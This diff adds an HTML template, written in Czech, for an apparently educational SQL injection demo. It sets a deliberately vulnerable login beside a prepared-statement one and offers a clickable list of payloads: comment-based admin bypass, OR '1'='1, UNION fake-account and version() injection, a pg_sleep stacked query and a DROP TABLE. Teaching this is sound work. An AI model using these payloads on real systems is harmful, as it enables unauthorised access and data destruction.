@@ -1,0 +1,264 @@
+{% extends "base.html" %}
+
+{% block title %}SQLi Login Bypass{% endblock %}
+
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12 d-flex justify-content-between align-items-center">
+        <div>
+            <h2 class="text-danger mb-1">
+                <i class="bi bi-incognito"></i> Login Bypass Simulace
+            </h2>
+            <p class="text-muted mb-0">
+                Cíl: Přihlásit se jako <strong>admin</strong> bez znalosti hesla.
+            </p>
+        </div>
+        <a href="{{ url_for('sqli.login_bypass', reset='true') }}" class="btn btn-outline-primary">
+            <i class="bi bi-arrow-counterclockwise"></i> Obnovit databázi (Reset)
+        </a>
+    </div>
+</div>
+
+<div class="row">
+    
+    <div class="col-md-6 mb-4">
+        <div class="card border-danger h-100 shadow-sm">
+            <div class="card-header bg-danger text-white text-center">
+                <h5 class="mb-0"><i class="bi bi-bug-fill"></i> Zranitelný Login</h5>
+            </div>
+            <div class="card-body">
+                <p class="small text-muted text-center mb-3">Vstupy se lepí přímo do SQL řetězce.</p>
+                
+                <form method="POST">
+                    <div class="mb-2">
+                        <label class="form-label small fw-bold">Uživatelské jméno</label>
+                        <input type="text" name="username" class="form-control border-danger username-target" value="{{ username_input }}" placeholder="admin">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold">Heslo</label>
+                        <input type="text" name="password" class="form-control border-danger password-target" value="{{ password_input }}" placeholder="...">
+                    </div>
+                    <div class="d-grid">
+                        <button type="submit" name="btn_unsafe" class="btn btn-danger">Přihlásit (HACK)</button>
+                    </div>
+                </form>
+
+                {% if unsafe_res %}
+                    <hr>
+                    <div class="mt-2">
+                        {% if unsafe_res.success %}
+                            <div class="alert alert-danger py-2 text-center border-2 border-danger">
+                                <h5 class="alert-heading mb-1 fw-bold"><i class="bi bi-unlock-fill"></i> HACK ÚSPĚŠNÝ!</h5>
+                                <div class="small">
+                                    Přihlášen: <strong>{{ unsafe_res.user }}</strong><br>
+                                    Role: <span class="badge bg-danger">{{ unsafe_res.role }}</span>
+                                </div>
+                            </div>
+                        {% else %}
+                            <div class="alert alert-success py-2 text-center border-2 border-success">
+                                <h6 class="mb-0 fw-bold"><i class="bi bi-shield-lock"></i> PŘÍSTUP ZAMÍTNUT</h6>
+                            </div>
+                        {% endif %}
+
+                        <label class="small fw-bold text-muted">Sestavený SQL příkaz:</label>
+                        <div class="alert alert-light border font-monospace p-2 small mb-0 text-break" style="color: #d63384; background-color: #fff0f3;">
+                            {{ unsafe_res.sql }}
+                        </div>
+
+                        {% if unsafe_res.error %}
+                            <div class="alert alert-warning small mt-2 mb-0 p-2">
+                                <strong>DB Chyba:</strong> {{ unsafe_res.error }}
+                            </div>
+                        {% endif %}
+                    </div>
+                {% endif %}
+
+            </div>
+        </div>
+    </div>
+
+    <div class="col-md-6 mb-4">
+        <div class="card border-success h-100 shadow-sm">
+            <div class="card-header bg-success text-white text-center">
+                <h5 class="mb-0"><i class="bi bi-shield-check"></i> Bezpečný Login</h5>
+            </div>
+            <div class="card-body">
+                <p class="small text-muted text-center mb-3">Používá Prepared Statements (SQLAlchemy).</p>
+                
+                <form method="POST">
+                    <div class="mb-2">
+                        <label class="form-label small fw-bold">Uživatelské jméno</label>
+                        <input type="text" name="username" class="form-control border-success username-target" value="{{ username_input }}" placeholder="admin">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label small fw-bold">Heslo</label>
+                        <input type="text" name="password" class="form-control border-success password-target" value="{{ password_input }}" placeholder="...">
+                    </div>
+                    <div class="d-grid">
+                        <button type="submit" name="btn_safe" class="btn btn-success">Přihlásit (SAFE)</button>
+                    </div>
+                </form>
+
+                {% if safe_res %}
+                    <hr>
+                    <div class="mt-2">
+                        {% if safe_res.success %}
+                            <div class="alert alert-warning py-2 text-center">
+                                <strong>PŘÍSTUP POVOLEN</strong><br><small>(zadáno správné heslo)</small>
+                            </div>
+                        {% else %}
+                            <div class="alert alert-success py-2 text-center border-2 border-success">
+                                <h5 class="alert-heading mb-0 fw-bold"><i class="bi bi-shield-check"></i> PŘÍSTUP ZAMÍTNUT</h5>
+                            </div>
+                        {% endif %}
+
+                        <label class="small fw-bold text-muted mt-2">Logika dotazu:</label>
+                        <div class="alert alert-light border font-monospace p-2 small mb-0" style="color: #0f5132; background-color: #f0fff4;">
+                            {{ safe_res.sql }}
+                        </div>
+                        <div class="text-muted small mt-1">
+                            Databáze hledala string: <code>{{ safe_res.real_param_u }}</code>
+                        </div>
+                        
+                        {% if safe_res.error %}
+                            <div class="alert alert-warning small mt-2 mb-0 p-2">
+                                <strong>DB Chyba:</strong> {{ safe_res.error }}
+                            </div>
+                        {% endif %}
+                    </div>
+                {% endif %}
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-2">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <i class="bi text-warning"></i> Seznam útoků
+            </div>
+            <div class="list-group list-group-flush" style="max-height: 450px; overflow-y: auto;">
+                
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="admin' --" data-pass="cokoliv">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">1. Komentářový útok</h6>
+                        <small>Target: Admin</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>admin' --</code>
+                    </p>
+                    <small class="text-muted">Znak <code>--</code> vyruší kontrolu hesla.</small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="' OR '1'='1" data-pass="' OR '1'='1">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">2. Pravdivá podmínka (1=1)</h6>
+                        <small>Target: První uživatel</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>' OR '1'='1</code>
+                    </p>
+                    <small class="text-muted">Podmínka je vždy pravda -> přihlásí prvního nalezeného.</small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="' UNION SELECT 999, 'hacker', 'heslo', 'SuperAdmin' --" data-pass="heslo">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">3. UNION Injection (Falešný účet)</h6>
+                        <small>Target: Hacker</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>' UNION SELECT 999, 'hacker', 'heslo', 'SuperAdmin' --</code>
+                    </p>
+                    <small class="text-muted">Vnutíme aplikaci neexistujícího uživatele.</small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="' UNION SELECT 1, version(), '123', 'DB_INFO' --" data-pass="123">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">4. Zjištění verze DB (Login)</h6>
+                        <small>Target: Info</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>' UNION SELECT 1, version()...</code>
+                    </p>
+                    <small class="text-muted">
+                        Místo jména uživatele se přihlásíme pod názvem verze databáze.
+                    </small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="admin'; SELECT pg_sleep(5); --" data-pass="123">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">5. DoS (Zpomalení 5s)</h6>
+                        <small>Target: Server</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>admin'; SELECT pg_sleep(5); --</code>
+                    </p>
+                    <small class="text-muted">Zasekne přihlašování na 5 vteřin.</small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="'; DROP TABLE bds.dummy_users; --" data-pass="123">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1 text-danger fw-bold">6. Smazat tabulku (DROP)</h6>
+                        <small>Target: Destrukce</small>
+                    </div>
+                    <p class="mb-1 small">
+                        Username: <code>'; DROP TABLE bds.dummy_users; --</code>
+                    </p>
+                    <small class="text-muted">
+                        Smaže tabulku uživatelů. Další pokusy o přihlášení skončí chybou.
+                    </small>
+                </button>
+
+                <button type="button" class="list-group-item list-group-item-action attack-trigger" 
+                        data-user="admin" data-pass="spatneheslo">
+                    <div class="d-flex w-100 justify-content-between">
+                        <h6 class="mb-1">7. Neplatný pokus</h6>
+                        <small>Validace</small>
+                    </div>
+                    <p class="mb-1 small text-muted">Správné jméno, špatné heslo.</p>
+                </button>
+
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const triggers = document.querySelectorAll('.attack-trigger');
+        const userInputs = document.querySelectorAll('.username-target');
+        const passInputs = document.querySelectorAll('.password-target');
+        
+        triggers.forEach(trigger => {
+            trigger.addEventListener('click', function() {
+                const uVal = this.getAttribute('data-user');
+                const pVal = this.getAttribute('data-pass');
+
+                // Vyplnit všechny username inputy
+                userInputs.forEach(input => {
+                    input.value = uVal;
+                    input.classList.add('bg-warning');
+                    setTimeout(() => input.classList.remove('bg-warning'), 300);
+                });
+
+                // Vyplnit všechny password inputy
+                passInputs.forEach(input => {
+                    input.value = pVal;
+                    input.classList.add('bg-warning');
+                    setTimeout(() => input.classList.remove('bg-warning'), 300);
+                });
+            });
+        });
+    });
+</script>
+{% endblock %}
